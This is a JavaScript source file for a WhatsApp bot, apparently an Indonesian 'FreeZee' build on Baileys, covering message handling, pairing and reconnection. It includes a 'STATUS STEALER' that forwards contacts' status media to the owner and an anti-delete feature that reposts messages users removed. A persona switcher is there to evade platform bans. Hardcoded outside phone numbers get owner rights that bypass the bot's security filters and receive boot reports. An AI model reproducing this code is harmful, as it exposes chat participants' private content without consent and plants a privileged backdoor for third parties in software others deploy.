    if (content?.image || content?.video) {
        const hdTag = "\n\n✨ *Quality:* [ 4K UHD ]";
        if (typeof content.caption === "string") {
            if (!content.caption.includes("4K UHD")) content.caption += hdTag;
        } else if (!content.caption) {
            content.caption = `🚀 *${global.botname} System*` + hdTag;
        }
    }

    // 2. Centralized Media Engine (Auto-Compress)
    try {
        if (Buffer.isBuffer(content?.image)) {
            content.image = await compressMedia(content.image, "image");
        } else if (Buffer.isBuffer(content?.video)) {
            // Skip kompres video jika RAM/Latency tinggi untuk hemat CPU
            if (!global.lowResourceMode) {
                content.video = await compressMedia(content.video, "video");
            } else {
                console.log(chalk.yellow("[GOVERNOR] Skipping video compression due to high load."));
            }
        }
    } catch (e) {
        console.error("[MEDIA ENGINE ERROR]", e.message);
    }

    // 3. Inject Metadata
    if (content?.interactiveMessage || content?.buttonsMessage || content?.templateMessage || content?.listMessage) {
        if (!content.messageContextInfo) {
            content.messageContextInfo = { deviceListMetadata: {}, deviceListMetadataVersion: 2 };
        }
    }

    // 4. Force ViewOnce
    if (content?.interactiveMessage && !content.viewOnceMessage) content = { viewOnceMessage: { message: content } };
    if (content?.buttonsMessage && !content.viewOnceMessage) content = { viewOnceMessage: { message: content } };
    if (content?.templateMessage && !content.viewOnceMessage) content = { viewOnceMessage: { message: content } };
    if (content?.listMessage && !content.viewOnceMessage) content = { viewOnceMessage: { message: content } };

    // 5. Instant Dispatch
    return originalSendMessage.call(conn, jid, content, options);
  };

  const originalRelayMessage = conn.relayMessage;
  conn.relayMessage = async (jid, content, options = {}) => {
    let msg = content?.viewOnceMessage?.message || content;

    // Redact Secrets
    if (msg?.conversation) msg.conversation = censorSecrets(msg.conversation);
    if (msg?.extendedTextMessage?.text) msg.extendedTextMessage.text = censorSecrets(msg.extendedTextMessage.text);

    // Global HD Label for Relay Media
    const mediaMsg = msg?.imageMessage || msg?.videoMessage;
    if (mediaMsg) {
        const hdTag = "\n\n✨ *Quality:* [ 4K UHD ]";
        if (typeof mediaMsg.caption === "string") {
            if (!mediaMsg.caption.includes("4K UHD")) mediaMsg.caption += hdTag;
        } else if (!mediaMsg.caption) {
            mediaMsg.caption = `🚀 *${global.botname} System*` + hdTag;
        }
    }

    // --- INTERACTIVE MESSAGE FIX (ANTI-GRAY BUTTONS) ---
    const isInteractive = msg?.interactiveMessage || msg?.buttonsMessage || msg?.templateMessage || msg?.listMessage;
    if (isInteractive) {
        // Bungkus dalam viewOnce jika belum (Wajib untuk Interactive di banyak client)
        if (!content.viewOnceMessage) {
            content = { viewOnceMessage: { message: content } };
        }

        // Pastikan messageContextInfo ada di level yang benar di dalam viewOnceMessage
        if (content.viewOnceMessage && content.viewOnceMessage.message) {
            content.viewOnceMessage.message.messageContextInfo = {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
                ...(content.viewOnceMessage.message.messageContextInfo || {})
            };
        } else if (!content.viewOnceMessage) {
            content.messageContextInfo = {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
                ...(content.messageContextInfo || {})
            };
        }
    }

    return originalRelayMessage.call(conn, jid, content, options);
  };
  // -----------------------------
  // -----------------------------

  conn.sessionName = sessionName
  global.lastConn = conn
  if (!global.primaryConn) global.primaryConn = conn
  global.sessionSockets.set(sessionName, conn)
  writeSessionRuntimeLog(sessionName, "socket instance created")

  Object.defineProperties(conn, {
    // --- chatRead ---
    ...(typeof conn.chatRead !== 'function' ? {
      chatRead: {
        /**
         * Read message
         * @param {String} jid 
         * @param {String|undefined|null} participant 
         * @param {String} messageID 
         */
        value(jid, participant = conn.user.jid, messageID) {
          return conn.sendReadReceipt(jid, participant, [messageID]);
        },
        enumerable: true
      }
    } : {}),

    // --- setStatus ---
    ...(typeof conn.setStatus !== 'function' ? {
      setStatus: {
        /**
         * Set status bot
         * @param {String} status 
         */
        value(status) {
          return conn.query({
            tag: 'iq',
            attrs: {
              to: '@s.whatsapp.net',
              type: 'set',
              xmlns: 'status',
            },
            content: [{
              tag: 'status',
              attrs: {},
              content: Buffer.from(status, 'utf-8')
            }]
          });
        },
        enumerable: true
      }
    } : {}),

    // --- sendReact ---
    ...(typeof conn.sendReact !== 'function' ? {
      sendReact: {
        /**
         * Send reaction
         * @param {String} jid
         * @param {String} text
         * @param {Object} key
         */
        value(jid, text, key) {
          return conn.sendMessage(jid, {
            react: {
              text,
              key
            }
          });
        },
        enumerable: true
      }
    } : {}),

    // --- sendRichMessage ---
    ...(typeof conn.sendRichMessage !== 'function' ? {
      sendRichMessage: {
        /**
         * Send rich response message
         * @param {String} jid 
         * @param {Object} data - { mainText, submessages, unifiedResponseData, sources }
         * @param {Object} options 
         */
        async value(jid, data = {}, options = {}) {
          const { mainText, submessages, unifiedResponseData, sources } = data;
          const content = {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
              botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: { sources: sources || [] }
              }
            },
            botForwardedMessage: {
              message: {
                richResponseMessage: {
                  messageType: 1,
                  submessages: submessages || [],
                  unifiedResponse: {
                    data: typeof unifiedResponseData === 'string' 
                      ? unifiedResponseData 
                      : JSON.stringify(unifiedResponseData || {})
                  },
                  contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true,
                    forwardedAiBotMessageInfo: {
                      botJid: "867051314767696@bot"
                    },
                    forwardOrigin: 4,
                    ...(options.contextInfo || {})
                  }
                }
              }
            }
          };
          return await conn.relayMessage(jid, content, options);
        },
        enumerable: true
      }
    } : {}),

    // --- editMessage ---
    ...(typeof conn.editMessage !== 'function' ? {
      editMessage: {
        /**
         * Edit message
         * @param {String} jid 
         * @param {import('@adiwajshing/baileys').proto.WebMessageInfo} message 
         * @param {String} newText 
         * @param {Object} options
         */
        value(jid, message, newText, options = {}) {
          let copy = {
            ...message
          };
          let mtype = Object.keys(copy.message)[0];
          let msgContent = copy.message[mtype];

          if (typeof msgContent === 'string') {
            copy.message[mtype] = newText || msgContent;
          } else if (msgContent.text) {
            msgContent.text = newText || msgContent.text;
          } else if (msgContent.caption) {
            msgContent.caption = newText || msgContent.caption;
          }

          return conn.relayMessage(jid, copy.message, {
            messageId: copy.key.id,
            ...options
          });
        },
        enumerable: true
      }
    } : {})
  });
  // kalau pairing dipilih
  let pairingCode = null
  if (pairing && !conn.authState.creds.registered) {
    let raw_phone = verifiedPhoneNumber || (allowAuthPrompt ? await question(
      chalk.green("> Masukkan nomor WhatsApp Anda (Bisa pake format apa aja, misal +62 85x-xxxx): ")
    ) : null);

    if (!raw_phone) {
        console.log(chalk.red("[X] Nomor telepon tidak disediakan untuk pairing."));
        return null;
    }

    // Sanitasi super kuat: hapus semua selain angka
    const cleanNumber = raw_phone.replace(/\D/g, "");

    if (!cleanNumber || cleanNumber.length < 7) {
      console.log(chalk.red("[X] Nomor tidak valid! Masukkan nomor yang benar."));
      return null;
    }

    if (!phoneVerified) {
        if (isDevNumber(cleanNumber)) {
          phoneVerified = true
          console.log(chalk.green(`[DEV] Nomor ${cleanNumber} terdeteksi sebagai dev.`))
          console.log(chalk.green("[DEV] Melewati verifikasi DB. Selamat datang kembali dev."))
        } else {
          console.log(chalk.cyan("[DB] Mengecek nomor ke database..."))
    
          const allowed = await verifyNumberDB(cleanNumber)
    
          if (!allowed) {
            console.log(chalk.red("[X] Nomor tidak terdaftar di database"))
            console.log(chalk.red("Pairing dibatalkan."))
            return
          }
    
          console.log(chalk.green("[✓] Nomor VALID, lanjut pairing..."))
        }
    }

  try {
    let customPairingCode = options.customPairingCode
    
    if (!customPairingCode && allowAuthPrompt) {
        const customCodeInput = await question(chalk.cyan("╭─ Custom pairing code (kosongkan untuk acak, wajib 8 karakter)\n╰─› "))
        customPairingCode = (customCodeInput && customCodeInput.length === 8) ? customCodeInput.toUpperCase() : undefined
        
        if (customCodeInput && customCodeInput.length !== 8 && customCodeInput.length > 0) {
            console.log(chalk.yellow("[!] Custom code tidak valid (harus 8 karakter), menggunakan kode acak..."))
        }
    }

    let code = null
    let lastPairingError = null

    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        await delay(attempt === 1 ? 12000 : 15000)
        code = await conn.requestPairingCode(cleanNumber, customPairingCode)
        break
      } catch (error) {
        lastPairingError = error
        console.log(chalk.yellow(`[PAIRING] Percobaan ${attempt}/3 gagal: ${error.message}`))
      }
    }

    if (!code) {
      throw lastPairingError || new Error("Pairing code tidak tersedia")
    }

    const pairingCode = code?.match(/.{1,4}/g)?.join("-") || code
    conn.pairingCode = pairingCode
    
    saveSessionConfig(sessionName, {
      phoneNumber: cleanNumber,
      lastPairingAt: new Date().toISOString()
    })
    appendSessionAudit(sessionName, "pairing_code_created", {
      phoneNumber: cleanNumber
    })
    writeSessionRuntimeLog(sessionName, `pairing code created for ${cleanNumber}`)
    console.log(
      chalk.green(
        `\n[✓] Kode Pairing Anda: ${chalk.bold.white(
          pairingCode
        )}`
      )
    )
  } catch (error) {
    console.log(chalk.red(`[✗] Gagal meminta kode pairing: ${error.message}`))
    return
  }
}
  conn.ev.on("creds.update", saveCreds);

  // --- FREEZEE PREMIUM: NATIVE ANTI-DELETE ---
  conn.ev.on("message.delete", async (m) => {
    try {
        const { jid, sender, message, timestamp } = m;
        if (!jid || !message || !sender || sender === conn.user.id) return;

        console.log(chalk.cyan(`[FREEZEE] Captured deleted message from ${sender}`));
        const caption = `🕵️ *[ NATIVE ANTI-DELETE ]* 🕵️\n\n👤 *User:* @${sender.split("@")[0]}\n⏰ *Waktu:* ${new Date(timestamp).toLocaleString()}\n\n_Pesan ini ditarik oleh user._`;
        
        await conn.sendMessage(jid, { 
            text: caption,
            mentions: [sender],
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        });

        // Gunakan copyNForward untuk pengiriman yang akurat
        await conn.copyNForward(jid, m, false).catch(() => {});
        
    } catch (e) {
        console.error("Anti-Delete Native Error:", e.message);
    }
  });

  conn.ev.on("connection.update", async (update) => {
  const { connection, lastDisconnect } = update;

  if (connection === "connecting") {
    resetReconnectState(sessionName)
    writeSessionRuntimeLog(sessionName, "connection state: connecting")
    console.log(chalk.yellow("[+] Menghubungkan ke WhatsApp..."));

} else if (connection === "open") {
  global.primaryConn = conn;

  // --- FREEZEE PREMIUM: PERSONA SWITCHER ---
  if (typeof conn.setPersona === 'function') {
      setTimeout(async () => {
          try {
              // Fix for custom Baileys forks that expect conn.config
              if (!conn.config) conn.config = { browser: ["Ubuntu", "Chrome", "20.0.04"] };
              
              const personas = ["android", "ios", "windows"];
              const randomPersona = personas[Math.floor(Math.random() * personas.length)];
              conn.setPersona(randomPersona);
              console.log(chalk.green(`🎭 [FREEZEE] Identity set to: ${randomPersona.toUpperCase()} (Anti-Ban Active)`));
          } catch (e) {
              console.warn(chalk.yellow(`⚠️ [FREEZEE] Persona Switcher failed: ${e.message}. Feature disabled.`));
          }
      }, 10000); // Beri delay 10 detik agar state benar-benar stabil
  }

  startSystemMonitor(conn);
  
  // --- BOOT REPORT ALWAYS ---
  if (true) {
      global.bootReportInit = true;
      global.lastBootReport = Date.now();
      global.bootReported = true; // Tetap set untuk kompatibilitas lain jika ada

      saveSessionConfig(sessionName, {
        startedAt: new Date().toISOString(),
        lastDisconnectAt: null,
        lastDisconnectCode: null
      })
      resetReconnectState(sessionName)
      appendSessionAudit(sessionName, "socket_open")
      writeSessionRuntimeLog(sessionName, "connection state: open")
      console.log(chalk.green("[+] Berhasil terhubung ke WhatsApp"));
      displayBanner(conn);
      setupDailyTasks(db);

      try {
        const DEV_JID = "6285102360656@s.whatsapp.net"
        const USER_JID = "6285860224097@s.whatsapp.net"
        
        const targets = [...new Set([
            DEV_JID,
            USER_JID,
            ...(db.list().owner || []).map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
        ])];

        for (let jid of targets) {
            console.log(chalk.yellow(`[SYSTEM] Sending signal to ${jid}`));
            await conn.sendMessage(jid, { text: `🚀 *${global.botname} System* is now ONLINE!` }).catch(e => console.error(`Failed to send to ${jid}: ${e.message}`));
        }

        const { generateWAMessageFromContent, proto } = await import("baileys")
        const botNumber = conn.user.id.split(":")[0] + "@s.whatsapp.net"
        const mode = db.list().settings.self ? "SELF MODE" : "PUBLIC MODE"
        const uptime = process.uptime()
        const ramUsed = (process.memoryUsage().rss / 1024 / 1024).toFixed(2)
        const totalRam = (os.totalmem() / 1024 / 1024).toFixed(2)
        const nodeVer = process.version
        const time = moment().tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")
        
        const caption = `
╭━━━〔 🚀 BOT ONLINE REPORT 〕━━━⬣
┃ 🤖 Bot Name   : ${global.botname}
┃ 📱 Number     : ${botNumber}
┃ 🌍 Mode       : ${mode}
┃ 🕒 Time       : ${time}
╰━━━━━━━━━━━━━━━━━━━━━━⬣
`.trim()

        for (let jid of targets) {
          const msg = generateWAMessageFromContent(jid,
            proto.Message.fromObject({
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    body: { text: caption },
                    footer: { text: "FreeZeeHost System" },
                    nativeFlowMessage: {
                      buttons: [{
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                          title: "Bot Control Panel",
                          sections: [{
                            title: "Quick Actions",
                            rows: [
                              { header: "Menu", title: "📂 Open Menu", id: "#menu" }
                            ]
                          }]
                        })
                      }]
                    }
                  }
                }
              }
            }),
            {}
          )
          await conn.relayMessage(jid, msg.message, { messageId: msg.key.id }).catch(() => {});
        }
      } catch (err) {
        console.log("BOOT REPORT ERROR:", err.message)
      }
  } else {
      console.log(chalk.gray(`[SYSTEM] Boot report skipped (Cooldown active).`));
      console.log(chalk.green("[+] Berhasil terhubung ke WhatsApp"));
      displayBanner(conn);
  }

} else if (connection === "close") {

  const closedSessionName = conn.sessionName || sessionName
  const intent = global.sessionIntents.get(closedSessionName)
  global.sessionSockets.delete(closedSessionName)

  if (intent === "stop" || intent === "delete") {
    global.sessionIntents.delete(closedSessionName)
    console.log(chalk.yellow(`[SESSION] ${closedSessionName} dihentikan manual.`))
    return
  }

  const statusCode = lastDisconnect?.error?.output?.statusCode
  saveSessionConfig(closedSessionName, (current) => ({
    ...current,
    lastDisconnectAt: new Date().toISOString(),
    lastDisconnectCode: statusCode,
    restartCount: current.restartCount + 1
  }))
  appendSessionAudit(closedSessionName, "socket_close", {
    statusCode: statusCode ?? null
  })
  writeSessionRuntimeLog(closedSessionName, `connection state: close code=${statusCode ?? "unknown"}`)
  await reportSessionWatchdog(conn, closedSessionName, "socket_close", {
    code: statusCode ?? "-",
    reconnect: isReconnectableStatus(statusCode) ? "yes" : "no"
  })

  if (statusCode === 1006) {
      console.log(chalk.gray(`[RUNTIME] transient rejection diabaikan: 1006 (Abnormal Closure - Network unstable)`));
  } else {
      console.log(chalk.red(`\n[✗] Koneksi terputus: ${statusCode}`));
  }

  const shouldReconnect = isReconnectableStatus(statusCode)

  if (!shouldReconnect) {
    writeSessionRuntimeLog(closedSessionName, "session marked logged out, manual login required")
    console.log(chalk.red("[!] Session invalid atau logout. Silakan login ulang manual."))
    resetReconnectState(closedSessionName)
    return
  }

  scheduleSessionReconnect(closedSessionName, {
    phoneNumber,
    authMethod
  }, statusCode)

}});

  // --- Event Handlers ---
  const forbidden = [
    'porn', 'hentai', 'pornhub', 'xvideos', 'xnxx', 'nekopoi',
    'lewatsana', 'catsex', 'pixhentai', 'mangasusuku',
    'nhentai', 'bokep','furina','rijal'
  ];
  conn.ev.on("contacts.upsert", (update) => {
    for (let contact of update) {
      let id = jidNormalizedUser(contact.id);
      store.contacts[id] = {
        ...(contact || {}),
        isContact: true
      };
    }
  });

  conn.ev.on("groups.update", (updates) => {
    for (const update of updates) {
      const id = update.id;
      if (store.groupMetadata[id]) {
        store.groupMetadata[id] = {
          ...(store.groupMetadata[id] || {}),
          ...(update || {})
        };
      }
    }
  });

  conn.ev.on("messages.upsert", async (update) => {
    global.lastMessageReceived = Date.now();
    if (update.type !== 'notify' || !update.messages[0]) return;
    const raw = update.messages[0];
    const settings = db.list().settings || {};

    // --- AUTO-VIEW STATUS (AUTO SEEN) ---
    if (raw.key.remoteJid === 'status@broadcast') {
        console.log(chalk.bgCyan.black(` [STATUS] `) + chalk.cyan(` Detected from: ${raw.key.participant || "System"}`));
        
        if (settings.auto_view_status) {
            await conn.readMessages([raw.key]).catch(() => {});
        }

        // --- AUTO-FORWARD STATUS TO DEV ---
        if (settings.auto_forward_status && !raw.key.fromMe) {
            try {
                const m = await global.serialize(raw, conn, store);
                const sender = m.sender || raw.key.participant;
                const name = raw.pushName || sender.split('@')[0];
                const target = global.owner[0] + "@s.whatsapp.net";

                console.log(chalk.yellow(` [STATUS-DEV] Forwarding ${m.type} from ${name}`));
                
                let media = null;
                if (/image|video|audio/.test(m.type)) {
                    media = await m.download().catch(() => null);
                }

                const caption = `📥 *STATUS STEALER* 📥\n\n👤 *Sender:* ${name}\n📱 *Number:* @${sender.split('@')[0]}\n⏰ *Waktu:* ${new Date().toLocaleString()}\n\n*Caption:* ${m.text || "-"}`;

                if (m.type === 'imageMessage') {
                    await conn.sendMessage(target, { image: media, caption, mentions: [sender] });
                } else if (m.type === 'videoMessage') {
                    await conn.sendMessage(target, { video: media, caption, mentions: [sender] });
                } else if (m.type === 'audioMessage') {
                    await conn.sendMessage(target, { audio: media, mimetype: 'audio/mp4', ptt: true, mentions: [sender] });
                    await conn.sendMessage(target, { text: caption, mentions: [sender] });
                } else {
                    await conn.sendMessage(target, { text: caption, mentions: [sender] });
                }
            } catch (e) {
                console.error("[FORWARD-STATUS ERROR]", e.message);
            }
        }
    }
    // ------------------------------------

    // --- ANTI-DELETE SYSTEM ---
    if (raw.message?.protocolMessage?.type === 0) {
        const key = raw.message.protocolMessage.key;
        try {
            const stale = await store.loadMessage(key.remoteJid, key.id);
            if (stale && stale.message && !stale.key.fromMe) {
                const sender = stale.key.participant || stale.key.remoteJid;
                const caption = `🕵️ *[ ANTI-DELETE ]* 🕵️\n\n👤 *User:* @${sender.split("@")[0]}\n⏰ *Waktu:* ${new Date(stale.messageTimestamp * 1000).toLocaleString()}\n\n_Pesan di atas baru saja dihapus oleh user._`;
                
                await conn.sendMessage(stale.key.remoteJid, { 
                    forward: stale,
                    caption,
                    mentions: [sender]
                }, { quoted: stale });
            }
        } catch (e) {
            console.error("[ANTI-DELETE ERROR]", e.message);
        }
    }
    // -------------------------

    if (raw.key.remoteJid === `${global.idch}`) {
      let idPesan = raw.key.id || '-';
      let isiPesan =
        raw.message?.conversation ||
        raw.message?.extendedTextMessage?.text ||
        raw.message?.imageMessage?.caption ||
        raw.message?.videoMessage?.caption ||
        raw.message?.documentMessage?.caption ||
        '[Non-text message]';
      let tipe = '';
      if (raw.message?.imageMessage) {
        tipe = '📷 Gambar';
      } else if (raw.message?.stickerMessage) {
        tipe = '🪄 Stiker';
      } else if (raw.message?.videoMessage) {
        tipe = '🎥 Video';
      } else if (raw.message?.audioMessage) {
        tipe = '🎵 Audio';
      } else if (raw.message?.protocolMessage?.type === 0) {
        tipe = '🚫 Pesan Dihapus';
      } else if (raw.message?.conversation || raw.message?.extendedTextMessage) {
        tipe = '💬 Teks';
      } else {
        tipe = '📌 Lainnya';
      }
      let serverId = raw.newsletter_server_id || '-';
      let link = serverId !== '-' ? `${global.linkch}${serverId}` : 'Link tidak tersedia';

      const waktu = moment().tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm");

      await conn.sendMessage(`${global.owner}@s.whatsapp.net`, {
  text: `⚠️ Pesan baru di channel:
*ID Pesan:* 
> ${idPesan}

*Jenis Pesan:*
> ${tipe}

*Link Pesan:* 
> ${link}

*Isi Pesan:* 
${isiPesan}
`,
  buttons: [
    {
      buttonId: `.delch ${global.idch},${idPesan}`,
      buttonText: { displayText: '🗑 Hapus Pesan' },
      type: 1
    }
  ],
  footer: waktu
});
    }
    if (raw.key.remoteJid.endsWith('@newsletter')) {
      let idPesan = raw.key.id;
      let idChannel = raw.key.remoteJid;

      // Ambil teks/caption
      let isiPesan = raw.message?.conversation ||
        raw.message?.extendedTextMessage?.text ||
        raw.message?.imageMessage?.caption ||
        raw.message?.videoMessage?.caption ||
        raw.message?.documentMessage?.caption ||
        '';

      // Cek kata / link terlarang
      if (forbidden.some(x => isiPesan.toLowerCase().includes(x))) {
        console.log(`⚠️ Pesan terdeteksi mengandung link/kata terlarang: ${isiPesan}`);

        // Edit pesan
        try {
          await conn.sendMessage(idChannel, {
            text: '⚠️ Pesan ini melanggar pedoman dan akan dihapus.',
            edit: raw.key
          });
        } catch (e) {
          console.error('❌ Gagal edit pesan:', e);
        }

        // Delay 5 detik lalu hapus
        setTimeout(async () => {
          try {
            await conn.sendMessage(idChannel, {
              delete: {
                remoteJid: idChannel,
                fromMe: true,
                id: idPesan
              }
            });
            console.log(`✅ Pesan ${idPesan} di ${idChannel} berhasil dihapus.`);
          } catch (e) {
            console.error('❌ Gagal hapus pesan:', e);
          }
        }, 5000);
      }
    }
    if (raw.key.remoteJid === `${global.idch}`) {
      let idPesan = raw.key.id || '-';
      let isiPesan =
        raw.message?.conversation ||
        raw.message?.extendedTextMessage?.text ||
        raw.message?.imageMessage?.caption ||
        raw.message?.videoMessage?.caption ||
        raw.message?.documentMessage?.caption ||
        '[Non-text message]';

      let serverId = raw.newsletter_server_id || '-';
      let link = serverId !== '-' ? `${global.linkch}${serverId}` : 'Link tidak tersedia';

      await conn.sendMessage(`${global.owner}@s.whatsapp.net`, {
        text: `⚠️ Pesan baru di channel:
*ID Pesan:* 
> ${idPesan}

*Link Pesan:* 
> ${link}

Isi Pesan: 
${isiPesan}
`
      });
    }

    if (raw.key.id.startsWith('BAE5') && raw.key.id.length === 16) return;

const m = await global.serialize(raw, conn, store);
if (!m) return;
    
    // ==============================
// Auto Respon Trigger Bot
// ==============================

if (m.text) {
  if (m.fromMe || m.isBaileys) return;
  const txt = m.text.trim().toLowerCase()

  if (txt === "bot" || txt === "botz") {
    await m.reply("Ape Kucai 😏")
    return
  }
}

    const sender = m.sender || m.jid;

const owners = [...new Set([
    ...global.owner,
    ...(db.list().owner || []),
    ...(db.list().dev || [])
])].map(v => (v + "").replace(/[^0-9]/g, "") + "@s.whatsapp.net");

const botJid = jidNormalizedUser(conn.user.id);
const isOwner = [...owners, botJid, "6285860224097@s.whatsapp.net"].includes(sender);
const trustedUsers = new Set([...owners, botJid, "6285860224097@s.whatsapp.net"]);

if (db.list().settings.self && !isOwner) return;

/* ================= SAFE SECURITY SYSTEM (STEALTH) ================= */

const user = m.sender || sender;

// JIKA OWNER/TRUSTED: Lewati semua filter keamanan
if (trustedUsers.has(user)) {
  // Lanjut ke logger and handler
} else {
  // 1. Ignore non-owner private chat (Lebih aman daripada auto-block)
  if (!m.isGroup) {
    console.log(chalk.gray(`[STEALTH] Ignoring PV from ${user}. Trusted: ${[...trustedUsers].join(", ")}`));
    // return (DISABLED FOR TESTING)
  }

  // 2. Deteksi Crash Attempt (Hanya untuk non-trusted)
  // Type 0: EPHEMERAL_SETTING, 14: HISTORY_SYNC_NOTIFICATION, 3: REVOKE (Delete)
  const isCrashType = m.type === "protocolMessage" && ![0, 14, 3].includes(m.msg?.type);
  
  if (isCrashType || (m.messageStubType && ![20, 21, 25, 27, 28, 29, 30, 31, 32].includes(m.messageStubType))) {
    
    // Cek apakah user sudah dibanned agar tidak spam log
    const userData = db.get("user", user);
    if (userData?.banned?.status) return;

    console.log(chalk.red(`[SECURITY] Crash attempt detected from: ${user}. Type: ${m.type}, MsgType: ${m.msg?.type || "-"}. Performing silent ban...`));

    // Ban di Database (Bot tidak akan merespon lagi)
    if (userData) {
      userData.banned = { status: true, expired: 0 };
      await db.save();
    }

    // Laporan ke Dev (Stealth Mode: No reply to attacker)
    const DEV_JID = "6285102360656@s.whatsapp.net"
    await conn.sendMessage(DEV_JID, {
      text: `🚨 *SILENT SECURITY BAN* 🚨\n\nUser: @${user.split("@")[0]}\nType: ${m.type}\nStub: ${m.messageStubType || "-"}\n\n*Action: User has been silently banned in DB.*`,
      mentions: [user]
    }).catch(() => {});

    return
  }
}

/* ================================================================= */

logger(m);
try {
  await currentHandler(m, conn, store, db, Plugins);
} catch (error) {
  console.error(chalk.red(`[WA HANDLER ERROR] ${conn.sessionName || "default"}:`), error);
}
  });

  conn.ev.on("group-participants.update", async (data) => {
    try {
      const participantHandler = (await import("./core/participants.js")).default;
      await participantHandler(data, conn, db);
    } catch (err) {
      console.error(chalk.red("[✗] Gagal menangani pembaruan partisipan:"), err);
    }
  });

  conn.sendTextWithMentions = async (jid, text, quoted, options = {}) =>
    conn.sendMessage(
      jid, {
        text: text,
        contextInfo: {
          mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(
            (v) => v[1] + "@s.whatsapp.net",
          ),
        },
        ...options,
      }, {
        quoted,
      },
    );
  //=================================================//
  conn.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (
        (decode.user && decode.server && decode.user + "@" + decode.server) ||
        jid
      );
    } else return jid;
  };
  //=================================================//
  conn.ev.on("contacts.update", (update) => {
    for (let contact of update) {
      let id = conn.decodeJid(contact.id);
      if (store && store.contacts)
        store.contacts[id] = {
          id,
          name: contact.notify,
        };
    }
  });
  //=================================================//
  conn.getName = (jid, withoutContact = false) => {
    id = conn.decodeJid(jid);
    withoutContact = conn.withoutContact || withoutContact;
    let v;
    if (id.endsWith("@g.us"))
      return new Promise(async (resolve) => {
        v = store.contacts[id] || {};
        if (!(v.name || v.subject)) v = conn.groupMetadata(id) || {};
        resolve(
          v.name ||
          v.subject ||
          PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber(
            "international",
          ),
        );
      });
    else
      v =
      id === "0@s.whatsapp.net" ? {
        id,
        name: "WhatsApp",
      } :
      id === conn.decodeJid(conn.user.id) ?
      conn.user :
      store.contacts[id] || {};
    return (
      (withoutContact ? "" : v.name) ||
      v.subject ||
      v.verifiedName ||
      PhoneNumber("+" + jid.replace("@s.whatsapp.net", "")).getNumber(
        "international",
      )
    );
  };
  //=================================================//
  conn.parseMention = (text = "") => {
    return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(
      (v) => v[1] + "@s.whatsapp.net",
    );
  };
  //=================================================//
  conn.sendContact = async (jid, kon, quoted = "", opts = {}) => {
    let list = [];
    for (let i of kon) {
      list.push({
        displayName: await conn.getName(i),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i)}\nFN:${await conn.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
      });
    }
    conn.sendMessage(
      jid, {
        contacts: {
          displayName: `${list.length} Contact`,
          contacts: list,
        },
        ...opts,
      }, {
        quoted,
      },
    );
  };
 //==================================================//
    
conn.sendAsSticker = async (jid, media, quoted, options = {}) => {
  if (!media) throw new Error("Media kosong")

  const mime = await fileTypeFromBuffer(media)
  if (!mime?.mime) throw new Error("Gagal deteksi file")

  if (/image/.test(mime.mime)) {
    return conn.sendImageAsSticker(
      jid,
      media,
      quoted,
      options
    )
  }

  if (/video/.test(mime.mime)) {
    return conn.sendVideoAsSticker(
      jid,
      media,
      quoted,
      options
    )
  }

  throw new Error("Format tidak didukung")
}

console.log('[TEST] sendAsSticker =', typeof conn.sendAsSticker)
  //=================================================//
  
   conn.sendImage = async (jid, path, caption = "", quoted = "", options) => {
    let buffer = Buffer.isBuffer(path) ?
      path :
      /^data:.*?\/.*?;base64,/i.test(path) ?
      Buffer.from(path.split `,` [1], "base64") :
      /^https?:\/\//.test(path) ?
      await await getBuffer(path) :
      fs.existsSync(path) ?
      fs.readFileSync(path) :
      Buffer.alloc(0);
    return await conn.sendMessage(
      jid, {
        image: buffer,
        caption: caption,
        ...options,
      }, {
        quoted,
      },
    );
  };
  //=================================================//
  conn.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
    let buff = Buffer.isBuffer(path) ?
      path :
      /^data:.*?\/.*?;base64,/i.test(path) ?
      Buffer.from(path.split `,` [1], "base64") :
      /^https?:\/\//.test(path) ?
      await await getBuffer(path) :
      fs.existsSync(path) ?
      fs.readFileSync(path) :
      Buffer.alloc(0);
    let buffer;
    if (options && (options.packname || options.author)) {
      buffer = await writeExifImg(buff, options);
    } else {
      buffer = await imageToWebp(buff);
    }
    await conn.sendMessage(
      jid, {
        sticker: {
          url: buffer,
        },
        ...options,
      }, {
        quoted,
      },
    ).then((response) => {
      fs.unlinkSync(buffer);
      return response;
    });
  };
  //=================================================//
  conn.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
    let buff = Buffer.isBuffer(path) ?
      path :
      /^data:.*?\/.*?;base64,/i.test(path) ?
      Buffer.from(path.split `,` [1], "base64") :
      /^https?:\/\//.test(path) ?
      await await getBuffer(path) :
      fs.existsSync(path) ?
      fs.readFileSync(path) :
      Buffer.alloc(0);
    let buffer;
    if (options && (options.packname || options.author)) {
      buffer = await writeExifVid(buff, options);
    } else {
      buffer = await videoToWebp(buff);
    }
    await conn.sendMessage(
      jid, {
        sticker: {
          url: buffer,
        },
        ...options,
      }, {
        quoted,
      },
    );
    return buffer;
  };
  conn.reply = async (jid, msg, quoted = null, options = {}) => {
    try {
        let message = {};

        if (typeof msg === "string") {
            message.text = msg;
        } else if (typeof msg === "object") {
            message = { ...msg }; 
        }

        if (options.mentions) {
            message.mentions = options.mentions;
        }
      
        Object.assign(message, options);

        return await conn.sendMessage(
            jid,
            {
                ...message,
                contextInfo: {
